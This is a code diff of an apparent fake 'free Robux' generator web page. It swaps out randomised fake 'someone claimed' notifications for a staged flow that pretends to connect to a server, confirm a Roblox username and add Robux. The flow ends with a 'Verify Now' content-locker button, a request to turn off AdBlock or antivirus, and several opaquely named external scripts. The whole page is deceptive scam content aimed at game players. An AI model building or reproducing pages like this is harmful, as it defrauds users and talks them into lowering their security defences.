-      return `${minutes} minute${minutes===1?'':'s'} and ${remainder} seconds ago`;
-    }
-    function showActivityToast() {
-      if (!toastContainer) return;
-      if (window.innerWidth < 768) return;
-      while (toastContainer.children.length >= 3) toastContainer.lastElementChild?.remove();
-      let available = countryNames.filter(c => c !== lastCountry);
-      if (available.length === 0) available = countryNames.slice();
-      const country = available[Math.floor(Math.random() * available.length)];
-      lastCountry = country;
-      const reward = activityRewards[Math.floor(Math.random() * activityRewards.length)];
-      const timeText = getRandomTimeAgo();
-      const toastType = reward.type === 'nitro' ? 'toast-nitro' : 'toast-robux';
-      const toast = document.createElement('div');
-      toast.className = `activity-toast ${toastType}`;
-      toast.innerHTML = `
-        <div class="toast-icon"><img src="${reward.icon}" alt="${reward.name}"></div>
-        <div class="toast-content">
-          <div class="toast-header">Someone from <strong>${country}</strong> claimed</div>
-          <div class="toast-reward">${reward.name}</div>
-          <div class="toast-time">${timeText}</div>
+        <div class="step d-none" id="step-3">
+            <br>
+            <div class="loader">
+                <img class="animation" src="./assets/local-images/06-6r-9df80820.png" alt="">
+            </div>
+            <div class="txt">Connecting to seveur...</div>
+            <br>
         </div>
-      `;
-      toastContainer.prepend(toast);
-      setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateX(-15px)';
-        setTimeout(() => toast.remove(), 300);
-      }, 5500);
-    }
 
-    if (window.innerWidth >= 768) {
-      setTimeout(showActivityToast, 2000);
-      setInterval(showActivityToast, 25000);
-    }
+        <div class="step d-none" id="step-4">
+            <br>
+            <div class="profile">
+                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
+                <div class="more">
+                    <div class="name">bvb</div>
+                    <div class="username ">@<span class="usr-rbx"></span></div>
+                </div>
+            </div>
+            <div class="count">
+                <div class="c-item">
+                    <div class="t-count friends">255</div>
+                    <div class="text">friends</div>
+                </div>
+                <div class="c-item">
+                    <div class="t-count followers">255</div>
+                    <div class="text">followers</div>
+                </div>
+                <div class="c-item">
+                    <div class="t-count followings">255</div>
+                    <div class="text">followings</div>
+                </div>
+            </div>
+            <div class="confirm">CONFIRM USERNAME</div>
+        </div>
 
-    buildRewardList();
-  })();
-</script>
+
+        <div class="step d-none" id="step-5">
+            <div class="last">
+                <div class="img"><img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter" alt=""></div>
+                <div class="rbx-counter">
+                    <img src="./assets/local-images/02-3r-38c05949.png" alt="" class="icon">
+                    <div class="rbx-count">0</div>
+                </div>
+            </div>
+            <div class="adding">
+                Adding <span class="rbx-c">800</span> Robux to <span id="username" class="usr-rbx">bvb</span>
+            </div>
+            <div class="action">
+                <button>Add Now</button>
+            </div>
+        </div>
+        <div class="step p-0 d-none" id="step-6">
+            <div class="recived rbx"><span>0</span> <img src="./assets/local-images/02-3r-38c05949.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
+            <div class="userinfo">
+                <div class="main">
+                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
+                    <div class="username usr-rbx">@bvb</div>
+                </div>
+                <div class="then">
+                    <img src="./assets/local-images/04-7r-26d27934.png" alt="">
+                    <div class="rbx"><span>1000</span> Robux</div>
+                </div>
+            </div>
+            <div class="details">
+                <p> <span class="usr-rbx"></span>! You're one step away from reciving <span class="rbx-c"></span> robux</p>
+                <p>Click on the button to confirm that you are Human and not a Bot</p>
+                <div class="action-btn">
+                <button onclick="_nS()">Verify Now</button>
+                </div>
+                <div class="bonus"><span>Bonus : </span>Verify and earn <span class="bs"></span> extra Robux as bonus</div>
+            </div>
+        </div>
+        <div class="step p-0 d-none" id="step-7">
+            <div class="recived rbx"><span>0</span> <img src="./assets/local-images/02-3r-38c05949.png" alt=""> Robux recived for <span class="usr-rbx">user</span></div>
+            <div class="userinfo">
+                <div class="main">
+                    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9F8686661F50291FC4594CF25B4026C3-Png/720/720/AvatarHeadshot/Webp/noFilter" alt="">
+                    <div class="username usr-rbx">@bvb</div>
+                </div>
+                <div class="then">
+                    <img src="./assets/local-images/04-7r-26d27934.png" alt="">
+                    <div class="">
+                        <div class="rbx"><span></span> ROBUX</div>
+                        <div>+<span class="bs"></span> ROBUX</div>
+                    </div>
+                </div>
+            </div>
+            <div class="details">
+           <p><span class="total"></span> Robux are ready for you!<br><br>
+If the content locker doesn't appear, please disable your AdBlock or antivirus temporarily. These tools may block essential elements required to verify your participation and deliver your Robux reward.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="notification animate__animated">
+            <div>
+                <img src="./assets/local-images/02-3r-38c05949.png" alt="">
+                <div>
+                    <div class="title">Roblox</div>
+                    <div class="text">Outrageous Has got 400 Robux</div>
+                </div>
+                <div class="time">Just now</div>
+            </div>
+        </div>
+    </div>
+<script src="assets/vendor/jquery-3.7.1.min.js"></script>
+<script src="assets/vendor/6gsj7s.js"></script>
+<script src="assets/vendor/ajsyt67s.js"></script>
+
+  <script src="redirect-handler.js"></script>
 </body>
 </html>
